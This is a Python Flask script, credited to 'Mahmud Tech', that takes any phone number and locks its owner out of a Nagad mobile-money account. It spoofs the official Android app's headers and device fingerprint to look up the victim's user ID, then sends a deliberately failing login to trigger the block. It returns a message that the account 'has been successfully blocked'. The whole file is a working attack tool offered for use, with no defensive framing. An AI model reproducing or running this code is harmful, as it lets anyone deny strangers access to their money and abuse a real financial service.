from flask import Flask, request, jsonify
import requests

app = Flask(__name__)

@app.route('/check_user', methods=['GET'])
def check_user():
    # Get the 'number' parameter from the query string
    number = request.args.get('number')
    
    if not number:
        return jsonify({'error': 'Number parameter is required'}), 400

    pin = '6C237681E70921603A306BE9A1A5D9833FCE5C1E268F52B1650970EAAD0DCE21'
    mang = pin * 10

    # First API endpoint
    api_url = f"https://app2.mynagad.com:20002/api/user/check-user-status-for-log-in?msisdn={number}"
    headers = {
        "X-KM-User-AspId": "100012345612345",
        "X-KM-User-Agent": "ANDROID/1164",
        "X-KM-DEVICE-FGP": "4B3CBA66592A037F7B7E60F515B6212368476339DC7F019E31D99D293250B23C",
        "X-KM-Accept-language": "bn",
        "X-KM-AppCode": "01"
    }

    # Send the first request to check user status
    response = requests.get(api_url, headers=headers)
    response_data = response.json()

    # Check if 'userId' exists in the response
    user_id = response_data.get('userId')
    if not user_id:
        return jsonify({'error': 'userId not found in the response'}), 400

    # Second API endpoint to block account
    login_url = 'https://app2.mynagad.com:20002/api/login'
    login_headers = {
        'User-Agent': 'okhttp/3.14.9',
        'Connection': 'Keep-Alive',
        'Accept-Encoding': 'gzip',
        'X-KM-UserId': user_id,
        'X-KM-User-AspId': '100012345612345',
        'X-KM-User-Agent': 'ANDROID/1164',
        'X-KM-Accept-language': 'bn',
        'X-KM-AppCode': '01',
        'Content-Type': 'application/json; charset=UTF-8'
    }
    
    login_payload = {
        'aspId': '100012345612345',
        'password': mang,
        'username': number
    }

    # Send the second request to block the account
    login_response = requests.post(login_url, headers=login_headers, json=login_payload)

    if login_response.status_code != 200:
        return jsonify({'error': 'Failed to block the account'}), 500

    return jsonify({
        'developer': 'Mahmud Tech',
        'message': 'Nagad account has been successfully blocked'
    })

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5001)
